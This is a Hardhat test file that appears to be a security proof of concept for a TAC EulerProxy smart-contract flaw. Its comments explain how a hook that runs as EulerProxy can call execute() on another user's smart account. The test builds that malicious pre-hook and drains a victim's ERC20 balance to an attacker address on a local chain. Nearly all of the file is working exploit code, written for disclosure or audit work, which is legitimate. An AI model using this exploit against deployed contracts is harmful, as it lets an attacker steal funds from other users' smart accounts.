import hre, { ethers } from "hardhat";
import { Signer } from "ethers";
import { expect } from "chai";
import { TacLocalTestSdk } from "@tonappchain/evm-ccl";
import { deployEulerProxy } from "../scripts/Euler/EulerProxyDeploy";
import { EulerProxy, ISAFactory, TestToken } from "../typechain-types";

// PoC: EulerProxy hook impersonation — any attacker with a CCL message can call
// execute() on ANY other user's TacSmartAccount that lives under EulerProxy.
//
// Root cause (chain of trust):
//   - TacSAFactory.getOrCreateSmartAccount keys SAs by (msg.sender, tvmWallet) and
//     sets owner = msg.sender. So EulerProxy is the owner of every SA it creates,
//     across every tvmCaller — including the victim's.
//   - TacSmartAccount.execute() is gated by onlyOwnerOrTicket, i.e. owner == EulerProxy.
//   - SaHelper.executePreHooks/PostHooks runs a hook with isFromSAPerspective == false
//     as `EulerProxy.call(target, value, data)` — an arbitrary call originating from
//     EulerProxy.
//   - Therefore an attacker, in their own CCL flow, can ship a self-perspective hook
//     with contractAddress = victimSA and data = TacSmartAccount.execute(target, value, data),
//     and the onlyOwnerOrTicket check passes because msg.sender == EulerProxy == owner.
//
// This PoC drains a raw ERC20 sitting in the victim's EulerProxy-scoped SA. The same
// primitive trivially works for: spending vault-connector approvals held by the SA,
// redeeming vault shares to the attacker, etc.

const tupleString =
  "tuple(" +
    "tuple(bool isFromSAPerspective, address contractAddress, uint256 value, bytes data)[] preHooks," +
    "tuple(bool isFromSAPerspective, address contractAddress, uint256 value, bytes data)[] postHooks," +
    "tuple(bool isFromSAPerspective, address contractAddress, uint256 value, bytes data) mainCallHook" +
  ")";
const bridgeString = "tuple(address[])";
const callArgsString = "tuple(address,address,uint256,bytes)";

const VICTIM_TVM = "EQVictimTvmWallet1111111111111111111111111111111";
const ATTACKER_TVM = "EQAttackerTvmWallet111111111111111111111111111111";

// EulerVaultConnector address from EulerConfig — not deployed on local hardhat,
// which is fine: a low-level call to an account with no code returns success.
// We only need the inner SA.execute(connector, ...) main call to not revert, and
// it doesn't, because the smart account just performs `connector.call(...)`.

describe("EulerProxy — hook impersonation of another user's SmartAccount", function () {
  let admin: Signer;
  let attackerEoa: Signer;
  let testSdk: TacLocalTestSdk;
  let tacSAFactory: ISAFactory;
  let eulerProxy: EulerProxy;
  let token: TestToken;
  let victimSA: string;

  before(async function () {
    [admin, attackerEoa] = await ethers.getSigners();

    testSdk = new TacLocalTestSdk();
    const crossChainLayerAddress = await testSdk.create(ethers.provider);

    tacSAFactory = new ethers.Contract(
      testSdk.getSmartAccountFactoryAddress(),
      hre.artifacts.readArtifactSync("ISAFactory").abi,
      admin,
    ) as unknown as ISAFactory;

    eulerProxy = await deployEulerProxy(
      admin,
      crossChainLayerAddress,
      await tacSAFactory.getAddress(),
      await admin.getAddress(),
    );

    const TestTokenFactory = await ethers.getContractFactory("TestToken");
    token = (await TestTokenFactory.deploy("Victim Token", "VIC")) as unknown as TestToken;
    await token.waitForDeployment();
  });

  it("attacker can call execute() on victim's SA via a self-perspective pre-hook", async function () {
    // 1) Predict the victim's SA address (CREATE2; deterministic before deployment).
    victimSA = await tacSAFactory.predictSmartAccountAddress(
      VICTIM_TVM,
      await eulerProxy.getAddress(),
    );

    const amount = ethers.parseUnits("1000", 18);

    // 2) Put ERC20 into the (predicted) victim SA. Token storage lives in the token
    //    contract, so this works even before the SA proxy is deployed.
    await (await token.mint(victimSA, amount)).wait();
    expect(await token.balanceOf(victimSA)).to.equal(amount);

    // 3) Have the victim send any CCL message to EulerProxy so the SA is actually
    //    deployed at the predicted address. Use a minimal call with no hooks; the
    //    inner connector call hits an EOA address (no code → low-level call returns
    //    success) so nothing reverts.
    await sendBenignVictimCall();
    expect(await ethers.provider.getCode(victimSA)).to.not.equal("0x");

    // 4) Attacker crafts a self-perspective pre-hook that calls victimSA.execute(...)
    //    via EulerProxy itself. EulerProxy is owner(victimSA) → onlyOwnerOrTicket passes.
    const attackerAddr = await attackerEoa.getAddress();

    const saIface = new ethers.Interface([
      "function execute(address target, uint256 value, bytes data) external returns (bytes)",
    ]);
    const tokenIface = new ethers.Interface([
      "function transfer(address,uint256) external returns (bool)",
    ]);

    const drainCalldata = tokenIface.encodeFunctionData("transfer", [attackerAddr, amount]);
    const executeOnVictimCalldata = saIface.encodeFunctionData("execute", [
      await token.getAddress(),
      0n,
      drainCalldata,
    ]);

    const maliciousHooks = {
      preHooks: [
        {
          isFromSAPerspective: false, // <-- the bug: hook runs as EulerProxy
          contractAddress: victimSA,
          value: 0n,
          data: executeOnVictimCalldata,
        },
      ],
      postHooks: [],
      mainCallHook: {
        isFromSAPerspective: false,
        contractAddress: ethers.ZeroAddress,
        value: 0n,
        data: "0x",
      },
    };

    // Dummy CallArguments for EulerProxy.call — the inner SA.execute(connector, ...)
    // call still runs, but the connector address has no code so it's a no-op success.
    const callArguments = [ethers.ZeroAddress, ethers.ZeroAddress, 0n, "0x"];
    const bridgeBackData = [[]]; // no bridging back

    const encodedArgs = new ethers.AbiCoder().encode(
      [tupleString, bridgeString, callArgsString],
      [maliciousHooks, bridgeBackData, callArguments],
    );

    const attackerBefore = await token.balanceOf(attackerAddr);
    const victimBefore = await token.balanceOf(victimSA);

    const { receipt } = await testSdk.sendMessage(
      2n,
      await eulerProxy.getAddress(),
      "call(bytes,bytes)",
      encodedArgs,
      ATTACKER_TVM, // attacker is a DIFFERENT tvm wallet from VICTIM_TVM
      [],
      [],
      0n,
      "0x",
      ethers.encodeBytes32String("attack"),
      BigInt(Math.floor(Date.now() / 1000)),
    );
    expect(receipt.status).to.equal(1);

    const attackerAfter = await token.balanceOf(attackerAddr);
    const victimAfter = await token.balanceOf(victimSA);

    console.log("victim SA   :", victimSA);
    console.log("attacker EOA:", attackerAddr);
    console.log("victim    before/after:", victimBefore.toString(), "/", victimAfter.toString());
    console.log("attacker  before/after:", attackerBefore.toString(), "/", attackerAfter.toString());

    expect(victimAfter).to.equal(0n);
    expect(attackerAfter - attackerBefore).to.equal(amount);
  });

  async function sendBenignVictimCall() {
    const benignHooks = {
      preHooks: [],
      postHooks: [],
      mainCallHook: {
        isFromSAPerspective: false,
        contractAddress: ethers.ZeroAddress,
        value: 0n,
        data: "0x",
      },
    };
    const benignCallArgs = [ethers.ZeroAddress, ethers.ZeroAddress, 0n, "0x"];
    const benignBridge = [[]];

    const args = new ethers.AbiCoder().encode(
      [tupleString, bridgeString, callArgsString],
      [benignHooks, benignBridge, benignCallArgs],
    );

    await testSdk.sendMessage(
      1n,
      await eulerProxy.getAddress(),
      "call(bytes,bytes)",
      args,
      VICTIM_TVM,
      [],
      [],
      0n,
      "0x",
      ethers.encodeBytes32String("victim-init"),
      BigInt(Math.floor(Date.now() / 1000)),
    );
  }
});
